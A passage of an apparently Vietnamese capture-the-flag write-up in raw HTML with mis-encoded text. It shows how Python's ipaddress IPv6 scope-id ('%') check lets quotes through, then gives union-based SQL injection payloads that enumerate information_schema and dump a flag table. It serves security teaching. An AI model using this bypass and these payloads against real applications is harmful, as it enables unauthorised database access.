&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-mysql" data-lang="mysql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;malicious_ip&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;13.37.13.37&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;too leet&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;103.12.104.72&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;phishing&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;42.112.213.88&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;phishing&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2405:f980::1:12&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;phishing&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;103.12.104.29&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;command &amp;amp; control server&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1337::dead:beef&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dead leet&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;LÆ°á»£n lá» cÃ¡c doc thÃ¬ mÃ¬nh tháº¥y cÃ³ pháº§n so sÃ¡nh táº¡i &lt;a class="link" href="https://blog.51cto.com/u_16099261/8620358" target="_blank" rel="noopener"
&gt;Ä‘Ã¢y&lt;/a&gt; khÃ¡ thÃº vá»‹ khi cÃ³ thá»ƒ chÃ¨n giÃ¡ trá»‹ Ä‘áº±ng sau Ä‘á»‹a chá»‰ IPv6 báº±ng dáº¥u &lt;code&gt;%&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJMMe0dj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
KhÃ´ng hiá»ƒu láº¯m nÃ³ cÃ³ tÃ¡c dá»¥ng gÃ¬, mÃ¬nh thá»­ chÃ¨n nhiá»u hÆ¡n lÃ  sá»‘ 1 vÃ o Ä‘áº±ng sau dáº¥u &lt;code&gt;%&lt;/code&gt; thÃ¬ tháº¥y hoÃ n toÃ n valid, mÃ¬nh cÃ³ thá»ƒ truyá»n vÃ o gáº§n nhÆ° báº¥t cá»© thá»© gÃ¬, trong Ä‘Ã³ cÃ³ cáº£ dáº¥u nhÃ¡y:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkO2eRuj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
LÃ½ do cho viá»‡c nÃ y thÃ¬ ta cáº§n pháº£i Ä‘i Ä‘oáº¡n code xá»­ lÃ½ hÃ m &lt;code&gt;ipaddress.ip_address()&lt;/code&gt;, hÃ m xÃ©t 2 trÆ°á»ng há»£p Ä‘á»‹a chá»‰ IP truyá»n vÃ o hoáº·c lÃ  IPv4 hay IPv6. Sau Ä‘Ã³ tiáº¿n hÃ nh check báº±ng viá»‡c gÃ¡n Ä‘á»‹a chá»‰ Ä‘Ã³ vÃ o 2 class, viá»‡c kiá»ƒm tra sáº½ Ä‘Æ°á»£c tiáº¿p tá»¥c diá»…n ra táº¡i phÆ°Æ¡ng thá»©c &lt;code&gt;__init__&lt;/code&gt; cá»§a 2 class Ä‘Ã³:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def ip_address(address):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return IPv4Address(address)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; except (AddressValueError, NetmaskValueError):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; pass
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return IPv6Address(address)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; except (AddressValueError, NetmaskValueError):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; pass
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; raise ValueError(f&amp;#39;{address!r} does not appear to be an IPv4 or IPv6 address&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Äi hÃ m method &lt;code&gt;__init__&lt;/code&gt; cá»§a class IPv6Address, ta sáº½ tháº¥y Ä‘á»‹a chá»‰ IP Ä‘Æ°á»£c kiá»ƒm tra xem Ä‘Æ°á»£c truyá»n vÃ o theo kiá»ƒu sá»‘ nguyÃªn, hay kiá»ƒu há»—n há»£p, vÃ  cuá»‘i cÃ¹ng lÃ  kiá»ƒu chuá»—i -&amp;gt; kiá»ƒu mÃ  ta truyá»n vÃ o:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Efficient constructor from integer.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;int&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_check_int_address&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_scope_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Constructing from a packed address&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_check_packed_address&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ne"&gt;int&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;big&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_scope_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Assume input argument to be string or any object representation&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# which converts into a formatted IP string.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;addr_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;addr_str&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;raise&lt;/span&gt; &lt;span class="n"&gt;AddressValueError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Unexpected &amp;#39;/&amp;#39; in {address!r}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;addr_str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_scope_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_split_scope_id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addr_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_ip_int_from_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addr_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Tiáº¿p tá»¥c Ä‘i vÃ o hÃ m &lt;code&gt;_split_scope_id&lt;/code&gt;, ta sáº½ tháº¥y Ä‘á»‹a chá»‰ IPv6 Ä‘Æ°á»£c chia thÃ nh 3 pháº§n thÃ´ng qua method partition(&amp;rsquo;%')
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;addr&lt;/code&gt; lÃ  pháº§n Ä‘áº±ng trÆ°á»›c dáº¥u %&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sep&lt;/code&gt; lÃ  dáº¥u %&lt;/li&gt;
&lt;li&gt;&lt;code&gt;scope_id&lt;/code&gt; lÃ  pháº§n Ä‘áº±ng sau dáº¥u %&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Náº¿u nhÆ° &lt;code&gt;sep&lt;/code&gt; (hay dáº¥u &lt;code&gt;%&lt;/code&gt;) khÃ´ng tá»“n táº¡i, máº·c Ä‘á»‹nh pháº§n Ä‘áº±ng sau cÅ©ng khÃ´ng tá»“n táº¡i, hay &lt;code&gt;scope_id&lt;/code&gt; lÃ  None. CÃ²n náº¿u nhÆ° khÃ´ng tá»“n táº¡i &lt;code&gt;scope_id&lt;/code&gt; mÃ  láº¡i xuáº¥t hiá»‡n dáº¥u &lt;code&gt;%&lt;/code&gt; thÃ¬ quÃ¡ trÃ¬nh parse sáº½ dÃ­nh lá»—i mÃ  raise exception&lt;/li&gt;
&lt;li&gt;Náº¿u vá»«a cÃ³ sep, vá»«a cÃ³ &lt;code&gt;scope_id&lt;/code&gt; thÃ¬ return 2 giÃ¡ trá»‹ addr -&amp;gt; Ä‘á»‹a chá»‰ IPv6 vÃ  &lt;code&gt;scope_id&lt;/code&gt;
-&amp;gt; pháº§n Ä‘áº±ng sau dáº¥u &lt;code&gt;%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@staticmethod
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def _split_scope_id(ip_str):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; addr, sep, scope_id = ip_str.partition(&amp;#39;%&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if not sep:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; scope_id = None
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; elif not scope_id or &amp;#39;%&amp;#39; in scope_id:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; raise AddressValueError(&amp;#39;Invalid IPv6 address: &amp;#34;%r&amp;#34;&amp;#39; % ip_str)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return addr, scope_id
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;VÃ­ dá»¥:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyDpzAujC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;li&gt;Sau Ä‘Ã³ addr lÃ  giÃ¡ trá»‹ &lt;code&gt;addr_str&lt;/code&gt;, Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m &lt;code&gt;_ip_int_from_string&lt;/code&gt; Ä‘á»ƒ Ä‘Æ°a vá» dáº¡ng Ä‘á»‹a chá»‰, sau Ä‘Ã³ gÃ¡n vÃ o thuá»™c tÃ­nh &lt;code&gt;_ip&lt;/code&gt; cá»§a object hiá»‡n táº¡i. CÃ²n &lt;code&gt;_scope_id&lt;/code&gt; táº¡m thá»i khÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng tiáº¿p trong method &lt;code&gt;__init__&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NhÆ° váº­y vá» cÆ¡ báº£n thÃ¬ mÃ¬nh cÃ³ thá»ƒ bypass hÃ m check &lt;code&gt;ipaddress.ip_address()&lt;/code&gt; báº±ng dáº¥u &lt;code&gt;%&lt;/code&gt; Ä‘áº±ng sau 1 Ä‘á»‹a chá»‰ IPv6 valid:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyJD40OiA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJ1OEC_oC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="exploit"&gt;Exploit
&lt;/h3&gt;&lt;p&gt;Viá»‡c khÃ³ Ä‘Ã£ lÃ m Ä‘Æ°á»£c, giá» mÃ¬nh chá»‰ cáº§n exploit SQLi Ä‘á»ƒ dump db lÃ  sol Ä‘Æ°á»£c challenge rá»“i.
Lá»£i dá»¥ng viá»‡c route hiá»ƒn thá»‹ táº¥t cáº£ cÃ¡c row cá»§a cÃ¢u lá»‡nh select thÃ´ng qua vÃ²ng for, mÃ¬nh dÃ¹ng union based Ä‘á»ƒ láº¥y thÃ´ng tin luÃ´n:
Táº¡i local thÃ¬ cÃ³ select tháº³ng luÃ´n vÃ¬ mÃ¬nh Ä‘Ã£ biáº¿t tÃªn báº£ng tÃªn cá»™t chá»©a flag:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1bmBCOjA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ²n lÃªn server thÃ¬ mÃ¬nh sáº½ láº¥y thÃ´ng tin vá» tÃªn báº£ng trÆ°á»›c báº±ng tÃªn db &lt;code&gt;malicip&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;1337::dead:beef%&amp;#39; union select null,table_name from information_schema.tables where table_schema=&amp;#34;malicip&amp;#34;-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1H2HA_i0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ÄÆ°á»£c tÃªn báº£ng lÃ  &lt;code&gt;______________________________________________m4LiC10u5_T413Le&lt;/code&gt;, mÃ¬nh tiáº¿p tá»¥c láº¥y cá»™t vÃ  láº¥y flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;1337::dead:beef%&amp;#39; union select null,column_name from information_schema.columns where table_name=&amp;#34;______________________________________________m4LiC10u5_T413Le&amp;#34;-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Byr-LCOoR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;1337::dead:beef%&amp;#39; union select null,_____________________________________________MaL1ci0uS_c0lUmnN from ______________________________________________m4LiC10u5_T413Le-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BygEUCOo0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
